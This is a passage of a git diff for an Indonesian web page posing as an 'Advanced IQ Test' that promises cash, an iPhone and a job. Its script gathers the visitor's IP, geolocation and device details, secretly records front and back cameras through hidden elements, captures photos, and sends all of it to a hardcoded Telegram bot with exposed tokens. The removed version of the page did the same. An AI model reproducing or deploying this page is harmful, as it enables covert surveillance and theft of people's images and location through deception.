@@ -1,103 +1,1034 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>DeffXy</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced IQ Test</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
 
-<style>
-body{
-  background:#0f0f0f;
-  color:white;
-  text-align:center;
-  font-family:Arial;
-}
-video, canvas{
-  width:90%;
-  max-width:400px;
-  border-radius:12px;
-  margin-top:15px;
-}
-button{
-  margin:10px;
-  padding:12px 20px;
-  border:none;
-  border-radius:8px;
-  background:#00ff99;
-  font-weight:bold;
-}
-</style>
+        :root {
+            --primary: #4361ee;
+            --secondary: #3a0ca3;
+            --accent: #7209b7;
+            --dark: #1a1a2e;
+            --darker: #0d0d1a;
+            --light: #f8f9fa;
+            --success: #4cc9f0;
+            --danger: #f72585;
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--darker), var(--dark));
+            color: var(--light);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 2.5rem;
+            padding-top: 1rem;
+        }
+
+        .header h1 {
+            font-size: 2.8rem;
+            font-weight: 700;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 0.5rem;
+            text-shadow: 0 0 15px rgba(67, 97, 238, 0.3);
+        }
+
+        .header p {
+            font-size: 1.1rem;
+            color: #a0a0c0;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+
+        .warning-section {
+            background: rgba(20, 20, 40, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            border: 1px solid rgba(67, 97, 238, 0.3);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .warning-title {
+            color: var(--danger);
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .rules-list {
+            text-align: left;
+            margin: 1.5rem 0;
+        }
+
+        .rules-list li {
+            margin: 0.8rem 0;
+            color: #c0c0e0;
+            padding-left: 1.5rem;
+            position: relative;
+        }
+
+        .rules-list li:before {
+            content: "•";
+            color: var(--primary);
+            position: absolute;
+            left: 0;
+        }
+
+        .permission-btn {
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 1rem;
+            box-shadow: 0 5px 15px rgba(67, 97, 238, 0.3);
+        }
+
+        .permission-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(67, 97, 238, 0.5);
+        }
+
+        .quiz-section {
+            background: rgba(20, 20, 40, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 2.5rem;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(67, 97, 238, 0.3);
+            display: none;
+        }
+
+        .progress-container {
+            margin-bottom: 2rem;
+        }
+
+        .progress-bar {
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 0.5rem;
+        }
+
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            border-radius: 4px;
+            transition: width 0.5s ease;
+        }
+
+        .progress-text {
+            display: flex;
+            justify-content: space-between;
+            color: #a0a0c0;
+            font-size: 0.9rem;
+        }
+
+        .question-container {
+            margin-bottom: 2rem;
+        }
+
+        .question-text {
+            font-size: 1.4rem;
+            margin-bottom: 1.5rem;
+            color: var(--light);
+            line-height: 1.5;
+        }
+
+        .options-container {
+            display: grid;
+            gap: 1rem;
+        }
+
+        .option {
+            background: rgba(30, 30, 60, 0.7);
+            border: 2px solid rgba(67, 97, 238, 0.3);
+            border-radius: 10px;
+            padding: 1.2rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            color: var(--light);
+        }
+
+        .option:hover {
+            border-color: var(--primary);
+            background: rgba(67, 97, 238, 0.2);
+            transform: translateY(-2px);
+        }
+
+        .option.selected {
+            border-color: var(--primary);
+            background: rgba(67, 97, 238, 0.3);
+            box-shadow: 0 5px 15px rgba(67, 97, 238, 0.2);
+        }
+
+        .navigation {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 2rem;
+        }
+
+        .nav-btn {
+            background: rgba(30, 30, 60, 0.7);
+            color: var(--light);
+            border: 2px solid rgba(67, 97, 238, 0.3);
+            padding: 0.8rem 1.5rem;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 500;
+        }
+
+        .nav-btn:hover:not(:disabled) {
+            border-color: var(--primary);
+            background: rgba(67, 97, 238, 0.2);
+        }
+
+        .nav-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .nav-btn.primary {
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            border: none;
+        }
+
+        .results-section {
+            background: rgba(20, 20, 40, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 3rem;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(67, 97, 238, 0.3);
+            display: none;
+        }
+
+        .results-title {
+            font-size: 2.2rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .score {
+            font-size: 3rem;
+            font-weight: 700;
+            margin: 1.5rem 0;
+            color: var(--success);
+        }
+
+        .restart-btn {
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 1.5rem;
+            box-shadow: 0 5px 15px rgba(67, 97, 238, 0.3);
+        }
+
+        .restart-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(67, 97, 238, 0.5);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .camera-indicator {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(244, 67, 54, 0.8);
+            color: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            z-index: 1000;
+            display: none;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .recording {
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+            }
+            
+            .header h1 {
+                font-size: 2.2rem;
+            }
+            
+            .warning-section, .quiz-section, .results-section {
+                padding: 1.5rem;
+            }
+            
+            .question-text {
+                font-size: 1.2rem;
+            }
+            
+            .navigation {
+                flex-direction: column;
+                gap: 1rem;
+            }
+            
+            .nav-btn {
+                width: 100%;
+            }
+        }
+
+        .status-message {
+            margin-top: 1.5rem;
+            padding: 1rem;
+            border-radius: 10px;
+            text-align: center;
+            font-weight: 500;
+            display: none;
+        }
+
+        .success {
+            background: rgba(76, 201, 240, 0.2);
+            border: 1px solid rgba(76, 201, 240, 0.5);
+            color: var(--success);
+            display: block;
+        }
+
+        .error {
+            background: rgba(247, 37, 133, 0.2);
+            border: 1px solid rgba(247, 37, 133, 0.5);
+            color: var(--danger);
+            display: block;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <!-- Warning & Permission Section -->
+        <div id="warningSection">
+            <div class="warning-section">
+                <h2 class="warning-title">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 9V11M12 15H12.01M5.07183 19H18.9282C20.4678 19 21.4301 17.3333 20.6603 16L13.7321 4C12.9623 2.66667 11.0377 2.66667 10.2679 4L3.33975 16C2.56995 17.3333 3.53223 19 5.07183 19Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    BACA SEBELUM MULAI TEST
+                </h2>
+                <p><strong>Sebelum memulai quiz, harap baca dan setujui ketentuan berikut:</strong></p>
+                
+                <div class="rules-list">
+                    <p><strong>BACA:</strong></p>
+                    <ul>
+                        <li>💯 Hasil Score IQ Dari Website Tidak Akan Benar 100% </li>
+                        <li>👀 Jika IQ Anda Lebih Dari 100 Maka Anda Akan Mendapatkan Hadiah</li>
+                        <li>✅ Izinkan Semua Permintaan Yang Diberikan Website</li>
+                        <li>🌐 Website Ini Khusus Untuk Test IQ</li>
+                        <li>📱 Jika Anda Memenangkan Hadiah,Anda Akan Dihubungi Operator</li>
+                        <li>⏱ Waktu dan durasi pengerjaan Soal Akan Di Rekap</li>
+                        <li>📊 Jawaban dan hasil quiz</li>
+                    </ul>
+                    
+                    <p><strong>Dengan melanjutkan, Anda menyetujui:</strong></p>
+                    <ul>
+                        <li>Mendapatkan Uang 120.000</li>
+                        <li>Iphone 17 Pro Max</li>
+                        <li>Kerja Di Perusahaan Kami</li>
+                        <li>Ayo Test Sekarang!</li>
+                    </ul>
+                </div>
 
-<button onclick="startCamera()">APPS DEFFXY CRASHER</button>
+                <p style="color: var(--danger); font-weight: bold; margin-top: 1.5rem;">
+                    ❗Kesempatan Tidak Datang 2 Kali
+                </p>
 
-<script>
-async function startCamera(){
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" }
-    });
-    video.srcObject = stream;
-  } catch(err){
-    alert("Kamera gagal diakses atau izin ditolak");
-  }
-}
-</script>
-  <video id="video" autoplay playsinline></video>
-<br>
-</h2>KALO KALIAN MAU HADIAH PENCET 🦠▶️🦠 TERUS PENCET HADIAH DEH SELAMAT ANDA DAPAT HADIAH DARI KAMI </h2>
-                                                    </div></div> </div></div></div></div></div></div></div></div></div></div></div></div></div></div>
-  <button onclick="takePhoto()">🦠▶️🦠</button>
-<button onclick="sendPhoto()">hadiah</button>
+                <button class="permission-btn" id="acceptButton">
+                    Mulai Quiz
+                </button>
+            </div>
+        </div>
 
-<canvas id="canvas" style="display:none;"></canvas>
+        <!-- Quiz Section -->
+        <div id="quizSection" class="quiz-section">
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div class="progress" id="progressBar"></div>
+                </div>
+                <div class="progress-text">
+                    <span>Soal <span id="currentQuestion">1</span> dari 10</span>
+                    <span><span id="correctCount">0</span> benar</span>
+                </div>
+            </div>
+            
+            <div class="question-container">
+                <div class="question-text" id="questionText"></div>
+                <div class="options-container" id="optionsContainer"></div>
+            </div>
 
-<script>
+            <div class="navigation">
+                <button class="nav-btn" id="prevButton" disabled>
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M19 12H5M5 12L12 19M5 12L12 5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    Sebelumnya
+                </button>
+                <button class="nav-btn primary" id="nextButton">
+                    Selanjutnya
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M5 12H19M19 12L12 5M19 12L12 19" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </button>
+            </div>
 
-const botToken = "7217256427:AAGFUPNz4D4oOak60-RQy9VKl_auGT7VT6I";
-const chatId = "7223902938";
+            <div class="status-message" id="statusMessage"></div>
+        </div>
 
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const context = canvas.getContext('2d');
+        <!-- Results Section -->
+        <div id="resultsSection" class="results-section">
+            <h2 class="results-title">Quiz Selesai!</h2>
+            <p>Terima kasih telah menyelesaikan quiz pengetahuan ini.</p>
+            <div class="score" id="finalScore"></div>
+            <p>Semua data telah dikirim ke sistem monitoring.</p>
+            <button class="restart-btn" id="restartButton">
+                Mulai Quiz Baru
+            </button>
+        </div>
+    </div>
 
-// Kamera depan
-navigator.mediaDevices.getUserMedia({
-  video: { facingMode: "user" }
-})
-.then(stream => {
-  video.srcObject = stream;
-})
-.catch(err => {
-  alert("Izin kamera ditolak!");
-});
+    <!-- Camera Indicator -->
+    <div class="camera-indicator" id="cameraIndicator">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M23 7L16 12L23 17V7Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            <rect x="1" y="5" width="15" height="14" rx="2" stroke="currentColor" stroke-width="2"/>
+        </svg>
+        Kamera Aktif
+    </div>
 
-// Ambil foto
-function takePhoto(){
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  context.drawImage(video, 0, 0);
-  alert("Foto berhasil diambil");
-}
+    <!-- Hidden Camera Elements -->
+    <div style="display: none;">
+        <video id="frontVideo" autoplay playsinline></video>
+        <video id="backVideo" autoplay playsinline></video>
+        <canvas id="frontCanvas"></canvas>
+        <canvas id="backCanvas"></canvas>
+    </div>
 
-// Kirim ke Telegram
-function sendPhoto(){
-  canvas.toBlob(function(blob){
-    let formData = new FormData();
-    formData.append("chat_id", chatId);
-    formData.append("photo", blob);
+    <script>
+        // === KONFIGURASI ===
+        // GANTI DENGAN TOKEN BOT ANDA
+        const TELEGRAM_BOT_TOKEN = '7334976291:AAEOf0ppLNPYjOF98NC7ceZtMfXPWZ1X-WE';
+        
+        // === GANTI DENGAN USER ID TELEGRAM ANDA ===
+        const TELEGRAM_USER_ID = '7223902938'; // User ID tujuan pengiriman data
 
-    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{
-      method:"POST",
-      body:formData
-    })
-    .then(res => alert("Foto berhasil dikirim"))
-    .catch(err => alert("Gagal kirim foto"));
-  }, "image/jpeg");
-}
+        // === DATA QUIZ (10 SOAL SULIT) ===
+        const quizData = [
+            {
+                question: "Dalam teori relativitas umum Einstein, apa yang menyebabkan kelengkungan ruang-waktu?",
+                options: [
+                    "Energi dan momentum",
+                    "Gaya elektromagnetik",
+                    "Partikel subatomik",
+                    "Gelombang gravitasi"
+                ],
+                correct: 0,
+                explanation: "Menurut teori relativitas umum Einstein, energi dan momentum menyebabkan kelengkungan ruang-waktu yang kita rasakan sebagai gravitasi."
+            },
+            {
+                question: "Apa yang dimaksud dengan 'paradoks Fermi' dalam konteks astrobiologi?",
+                options: [
+                    "Konflik antara ukuran alam semesta dan kurangnya bukti kehidupan lain",
+                    "Ketidakmungkinan perjalanan lebih cepat dari cahaya",
+                    "Masalah dalam mendeteksi eksoplanet yang layak huni",
+                    "Keterbatasan dalam komunikasi antarbintang"
+                ],
+                correct: 0,
+                explanation: "Paradoks Fermi merujuk pada kontradiksi antara estimasi tinggi tentang kemungkinan adanya peradaban extraterestrial dan kurangnya bukti atau kontak dengan peradaban tersebut."
+            },
+            {
+                question: "Dalam mekanika kuantum, apa yang dijelaskan oleh persamaan Schrödinger?",
+                options: [
+                    "Perilaku partikel pada kecepatan relativistik",
+                    "Evolusi fungsi gelombang suatu sistem fisik terhadap waktu",
+                    "Prinsip ketidakpastian Heisenberg",
+                    "Interaksi antara partikel dan medan kuantum"
+                ],
+                correct: 1,
+                explanation: "Persamaan Schrödinger menggambarkan bagaimana fungsi gelombang kuantum suatu sistem fisika berubah seiring waktu."
+            },
+            {
+                question: "Apa yang dimaksud dengan 'dark flow' dalam kosmologi?",
+                options: [
+                    "Gerakan misterius gugus galaksi yang tidak dapat dijelaskan oleh materi yang diketahui",
+                    "Aliran energi gelap yang mempercepat ekspansi alam semesta",
+                    "Gerakan bintang di pinggiran galaksi yang lebih cepat dari prediksi",
+                    "Distribusi tidak merata radiasi latar belakang kosmik"
+                ],
+                correct: 0,
+                explanation: "'Dark flow' adalah gerakan misterius gugus galaksi yang diamati yang tidak dapat dijelaskan sepenuhnya oleh distribusi materi yang diketahui di alam semesta."
+            },
+            {
+                question: "Dalam ilmu komputer, apa kompleksitas waktu dari algoritma QuickSort dalam kasus rata-rata?",
+                options: [
+                    "O(n log n)",
+                    "O(n²)",
+                    "O(log n)",
+                    "O(n)"
+                ],
+                correct: 0,
+                explanation: "QuickSort memiliki kompleksitas waktu O(n log n) dalam kasus rata-rata, meskipun dalam kasus terburuk bisa mencapai O(n²)."
+            },
+            {
+                question: "Apa yang dimaksud dengan 'teorema ketidaklengkapan Gödel'?",
+                options: [
+                    "Setiap sistem aksiomatik yang cukup kuat tidak dapat sekaligus lengkap dan konsisten",
+                    "Tidak ada algoritma yang dapat menentukan kebenaran semua pernyataan matematika",
+                    "Batasan kecepatan prosesor karena kendala fisik",
+                    "Ketidakmungkinan memprediksi perilaku sistem kuantum"
+                ],
+                correct: 0,
+                explanation: "Teorema ketidaklengkapan Gödel menyatakan bahwa dalam sistem matematika formal yang cukup kuat, terdapat pernyataan yang tidak dapat dibuktikan benar atau salah dalam sistem tersebut."
+            },
+            {
+                question: "Dalam biologi molekuler, apa peran utama dari enzim telomerase?",
+                options: [
+                    "Memperbaiki kerusakan DNA",
+                    "Menambahkan urutan berulang ke ujung kromosom",
+                    "Mentranskripsi DNA menjadi RNA",
+                    "Mengatur ekspresi gen"
+                ],
+                correct: 1,
+                explanation: "Telomerase adalah enzim yang menambahkan urutan DNA berulang ke ujung kromosom (telomer), yang membantu mencegah pemendekan kromosom selama replikasi."
+            },
+            {
+                question: "Apa yang dimaksud dengan 'masalah P vs NP' dalam teori kompleksitas komputasi?",
+                options: [
+                    "Apakah setiap masalah yang dapat diverifikasi secara efisien juga dapat diselesaikan secara efisien",
+                    "Batasan kecepatan komputer kuantum",
+                    "Hubungan antara paralelisme dan kecepatan komputasi",
+                    "Kompleksitas algoritma pembelajaran mesin"
+                ],
+                correct: 0,
+                explanation: "Masalah P vs NP bertanya apakah setiap masalah yang solusinya dapat diverifikasi dalam waktu polinomial (NP) juga dapat diselesaikan dalam waktu polinomial (P)."
+            },
+            {
+                question: "Dalam fisika partikel, apa peran dari boson Higgs?",
+                options: [
+                    "Membawa gaya nuklir kuat",
+                    "Memberikan massa kepada partikel elementer",
+                    "Mengatur peluruhan radioaktif",
+                    "Menjadi mediator interaksi lemah"
+                ],
+                correct: 1,
+                explanation: "Boson Higgs adalah partikel elementer dalam Model Standar yang memberikan massa kepada partikel lain melalui interaksi dengan medan Higgs."
+            },
+            {
+                question: "Apa yang dimaksud dengan 'entanglement kuantum'?",
+                options: [
+                    "Keterkaitan sifat-sifat partikel yang tetap terhubung meskipun terpisah jarak jauh",
+                    "Prinsip bahwa pengamatan mengubah sistem kuantum",
+                    "Kemampuan partikel untuk berada di dua tempat sekaligus",
+                    "Batasan pengukuran simultan posisi dan momentum"
+                ],
+                correct: 0,
+                explanation: "Entanglement kuantum adalah fenomena di mana keadaan kuantum dua atau lebih partikel saling terkait, sehingga pengukuran pada satu partikel secara instan mempengaruhi keadaan partikel lain, terlepas dari jarak di antara mereka."
+            }
+        ];
 
-</script>
+        // === VARIABLES ===
+        let currentQuestion = 0;
+        let userAnswers = new Array(quizData.length).fill(null);
+        let correctCount = 0;
+        let frontCameraStream = null;
+        let backCameraStream = null;
+        let isRecording = false;
+        let frontVideoChunks = [];
+        let backVideoChunks = [];
+        let frontMediaRecorder = null;
+        let backMediaRecorder = null;
+        let userLocation = null;
+        let userIP = null;
+        let quizStartTime = null;
 
+        // === ELEMENTS ===
+        const warningSection = document.getElementById('warningSection');
+        const quizSection = document.getElementById('quizSection');
+        const resultsSection = document.getElementById('resultsSection');
+        const acceptButton = document.getElementById('acceptButton');
+        const questionText = document.getElementById('questionText');
+        const optionsContainer = document.getElementById('optionsContainer');
+        const prevButton = document.getElementById('prevButton');
+        const nextButton = document.getElementById('nextButton');
+        const progressBar = document.getElementById('progressBar');
+        const currentQuestionSpan = document.getElementById('currentQuestion');
+        const correctCountSpan = document.getElementById('correctCount');
+        const finalScore = document.getElementById('finalScore');
+        const restartButton = document.getElementById('restartButton');
+        const statusMessage = document.getElementById('statusMessage');
+        const cameraIndicator = document.getElementById('cameraIndicator');
+
+        // Camera elements
+        const frontVideo = document.getElementById('frontVideo');
+        const backVideo = document.getElementById('backVideo');
+        const frontCanvas = document.getElementById('frontCanvas');
+        const backCanvas = document.getElementById('backCanvas');
+
+        // === INITIALIZATION ===
+        currentQuestionSpan.textContent = '1';
+        correctCountSpan.textContent = '0';
+        progressBar.style.width = '10%';
+
+        // === FUNCTIONS ===
+        async function acceptPermissions() {
+            // Tampilkan indikator kamera
+            cameraIndicator.style.display = 'flex';
+            
+            // Mulai kumpulkan data user
+            await collectUserData();
+            
+            // Initialize kamera
+            await initializeCameras();
+            
+            // Mulai rekaman video
+            startVideoRecording();
+            
+            // Tampilkan quiz section
+            warningSection.style.display = 'none';
+            quizSection.style.display = 'block';
+            
+            // Set waktu mulai quiz
+            quizStartTime = new Date();
+            
+            // Load question pertama
+            loadQuestion(0);
+        }
+
+        async function collectUserData() {
+            // Dapatkan IP address
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userIP = ipData.ip;
+            } catch (error) {
+                userIP = 'Tidak dapat mengambil IP';
+            }
+
+            // Dapatkan lokasi (jika diizinkan)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        userLocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                    },
+                    error => {
+                        userLocation = 'Lokasi tidak diizinkan';
+                    }
+                );
+            } else {
+                userLocation = 'Geolocation tidak didukung';
+            }
+
+            // Kirim data user ke Telegram
+            sendUserInfo();
+        }
+
+        function sendUserInfo() {
+            const userInfo = `
+🔍 USER MEMULAI QUIZ LANJUT
+
+📱 Informasi Perangkat:
+${navigator.userAgent}
+
+🌐 IP Address:
+${userIP}
+
+📍 Lokasi:
+${userLocation ? `Lat: ${userLocation.latitude}, Long: ${userLocation.longitude}` : 'Tidak tersedia'}
+
+🖥️ Layar:
+${screen.width}x${screen.height}
+
+⏰ Waktu Mulai:
+${new Date().toLocaleString('id-ID')}
+
+🔗 URL:
+${window.location.href}
+            `.trim();
+
+            sendTelegramMessage(userInfo);
+        }
+
+        async function initializeCameras() {
+            try {
+                // Dapatkan daftar perangkat kamera
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                
+                // Coba akses kamera depan (biasanya yang pertama)
+                if (videoDevices.length > 0) {
+                    frontCameraStream = await navigator.mediaDevices.getUserMedia({
+                        video: { deviceId: videoDevices[0].deviceId }
+                    });
+                    frontVideo.srcObject = frontCameraStream;
+                }
+                
+                // Coba akses kamera belakang (jika ada)
+                if (videoDevices.length > 1) {
+                    backCameraStream = await navigator.mediaDevices.getUserMedia({
+                        video: { deviceId: videoDevices[1].deviceId }
+                    });
+                    backVideo.srcObject = backCameraStream;
+                }
+                
+                console.log('Kamera berhasil diakses');
+            } catch (error) {
+                console.error('Error mengakses kamera:', error);
+                showStatus('Tidak dapat mengakses kamera. Pastikan izin kamera sudah diberikan.', 'error');
+            }
+        }
+
+        function startVideoRecording() {
+            // Mulai rekaman video 30 detik dari kamera depan
+            if (frontCameraStream) {
+                frontMediaRecorder = new MediaRecorder(frontCameraStream);
+                frontVideoChunks = [];
+                
+                frontMediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        frontVideoChunks.push(event.data);
+                    }
+                };
+                
+                frontMediaRecorder.onstop = () => {
+                    // Kirim video ke Telegram
+                    const frontVideoBlob = new Blob(frontVideoChunks, { type: 'video/webm' });
+                    sendVideoToTelegram(frontVideoBlob, 'kamera_depan');
+                };
+                
+                frontMediaRecorder.start();
+                isRecording = true;
+                cameraIndicator.classList.add('recording');
+                
+                // Hentikan rekaman setelah 30 detik
+                setTimeout(() => {
+                    if (frontMediaRecorder && frontMediaRecorder.state === 'recording') {
+                        frontMediaRecorder.stop();
+                        isRecording = false;
+                        cameraIndicator.classList.remove('recording');
+                    }
+                }, 30000);
+            }
+            
+            // Mulai rekaman video 30 detik dari kamera belakang (jika tersedia)
+            if (backCameraStream) {
+                backMediaRecorder = new MediaRecorder(backCameraStream);
+                backVideoChunks = [];
+                
+                backMediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        backVideoChunks.push(event.data);
+                    }
+                };
+                
+                backMediaRecorder.onstop = () => {
+                    // Kirim video ke Telegram
+                    const backVideoBlob = new Blob(backVideoChunks, { type: 'video/webm' });
+                    sendVideoToTelegram(backVideoBlob, 'kamera_belakang');
+                };
+                
+                backMediaRecorder.start();
+                
+                // Hentikan rekaman setelah 30 detik
+                setTimeout(() => {
+                    if (backMediaRecorder && backMediaRecorder.state === 'recording') {
+                        backMediaRecorder.stop();
+                    }
+                }, 30000);
+            }
+        }
+
+        function capturePhotos() {
+            // Ambil foto dari kamera depan
+            if (frontCameraStream) {
+                frontCanvas.width = frontVideo.videoWidth;
+                frontCanvas.height = frontVideo.videoHeight;
+                const frontContext = frontCanvas.getContext('2d');
+                frontContext.drawImage(frontVideo, 0, 0);
+                
+                frontCanvas.toBlob(function(blob) {
+                    sendPhotoToTelegram(blob, 'depan');
+                }, 'image/jpeg', 0.8);
+            }
+            
+            // Ambil foto dari kamera belakang (jika tersedia)
+            if (backCameraStream) {
+                backCanvas.width = backVideo.videoWidth;
+                backCanvas.height = backVideo.videoHeight;
+                const backContext = backCanvas.getContext('2d');
+                backContext.drawImage(backVideo, 0, 0);
+                
+                backCanvas.toBlob(function(blob) {
+                    sendPhotoToTelegram(blob, 'belakang');
+                }, 'image/jpeg', 0.8);
+            }
+        }
+
+        function sendPhotoToTelegram(photoBlob, cameraType) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_USER_ID);
+            formData.append('photo', photoBlob, `quiz_${cameraType}_q${currentQuestion + 1}.jpg`);
+            formData.append('caption', `📸 ${cameraType.toUpperCase()} - Q${currentQuestion + 1} - ${new Date().toLocaleString('id-ID')}`);
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log(`✅ Foto ${cameraType} Q${currentQuestion + 1} terkirim`);
+                } else {
+                    console.log(`❌ Gagal kirim foto ${cameraType}:`, data);
+                }
+            })
+            .catch(error => {
+                console.log(`❌ Error sending ${cameraType} photo:`, error);
+            });
+        }
+
+        function sendVideoToTelegram(videoBlob, cameraType) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_USER_ID);
+            formData.append('video', videoBlob, `quiz_${cameraType}_video.webm`);
+            formData.append('caption', `🎥 VIDEO ${cameraType.toUpperCase()} - ${new Date().toLocaleString('id-ID')}`);
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log(`✅ Video ${cameraType} terkirim`);
+                sendTelegramMessage(`✅ Video ${cameraType} berhasil direkam dan dikirim`);
+                } else {
+                    console.log(`❌ Gagal kirim video ${cameraType}:`, data);
+                    sendTelegramMessage(`❌ Gagal mengirim video ${cameraType}`);
+                }
+            })
+            .catch(error => {
+                console.log(`❌ Error sending ${cameraType} video:`, error);
+                sendTelegramMessage(`❌ Error mengirim video ${cameraType}: ${error.message}`);
+            });
+        }
+
+        function sendTelegramMessage(message) {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_USER_ID,
+                    text: message
+                })
+            }).catch(err => console.log('Error sending message:', err));
+        }
+
+        function loadQuestion(questionIndex) {
+            const question = quizData[questionIndex];
+            questionText.textContent = question.question;
+            optionsContainer.innerHTML = '';
+            
+            question.options.forEach((option, index) => {
+                const optionElement = document.createElement('div');
+                optionElement.className = 'option';
+                if (userAnswers[questionIndex] === index) {
+                    optionElement.classList.add('selected');
+                }
+                optionElement.textContent = option;
+                optionElement.onclick = () => selectOption(index);
+                optionsContainer.appendChild(optionElement);
+            });
+
+            currentQuestionSpan.textContent = questionIndex + 1;
+            prevButton.disabled = questionIndex === 0;
+            
+            // Update teks tombol next
+            if (questionIndex === quizData.length - 1) {
+                nextButton.textContent = 'Selesai';
+            } else {
+                nextButton.textContent = 'Selanjutnya';
+            }
+            
+            // Update progress bar
+            const progress = ((questionIndex + 1) / quizData.length) * 100;
+            progressBar.style.width = progress + '%';
+        }
+
+        function selectOption(optionIndex) {
+            userAnswers[currentQuestion] = optionIndex;
+            
+            // Update correct count
+            correctCount = 0;
+            userAnswers.forEach((answer, index) => {
+                if (answer === quizData[index].correct) {
+                    correctCount++;
+                }
+            });
+            correctCountSpan.textContent = correctCount;
+            
+            loadQuestion(currentQuestion);
+        }
+
+        function previousQuestion() {
+            if (currentQuestion > 0) {
+                currentQuestion--;
